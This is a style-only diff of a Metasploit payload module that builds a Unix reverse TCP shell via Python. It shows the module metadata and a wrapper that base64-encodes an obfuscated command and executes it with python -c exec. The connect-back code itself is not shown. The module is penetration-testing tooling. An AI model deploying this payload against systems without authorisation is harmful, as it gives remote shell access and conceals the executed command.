@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -17,26 +17,25 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Unix Command Shell, Reverse TCP (via Python)',
-      'Version'     => '$Revision: 1 $',
-      'Description' => 'Connect back and create a command shell via Python',
-      'Author'      => 'Brendan Coles <bcoles[at]gmail.com>',
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'unix',
-      'Arch'        => ARCH_CMD,
-      'Handler'     => Msf::Handler::ReverseTcp,
-      'Session'     => Msf::Sessions::CommandShell,
-      'PayloadType' => 'cmd',
-      'RequiredCmd' => 'python',
-      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
-    ))
+                     'Name'        => 'Unix Command Shell, Reverse TCP (via Python)',
+                     'Version'     => '$Revision: 1 $',
+                     'Description' => 'Connect back and create a command shell via Python',
+                     'Author'      => 'Brendan Coles <bcoles[at]gmail.com>',
+                     'License'     => MSF_LICENSE,
+                     'Platform'    => 'unix',
+                     'Arch'        => ARCH_CMD,
+                     'Handler'     => Msf::Handler::ReverseTcp,
+                     'Session'     => Msf::Sessions::CommandShell,
+                     'PayloadType' => 'cmd',
+                     'RequiredCmd' => 'python',
+                     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }))
     register_options([
-      OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash'])
-    ], self.class)
+                       OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash'])
+                     ], self.class)
   end
 
   def generate
-    return super + command_string
+    super + command_string
   end
 
   #
@@ -44,7 +43,7 @@ module MetasploitModule
   #
 
   def random_padding
-    " "*rand(10)
+    " " * rand(10)
   end
 
   #
@@ -57,5 +56,4 @@ module MetasploitModule
     encoded_cmd = Rex::Text.encode_base64(obfuscated_cmd)
     "python -c \"exec('#{encoded_cmd}'.decode('base64'))\""
   end
-
 end
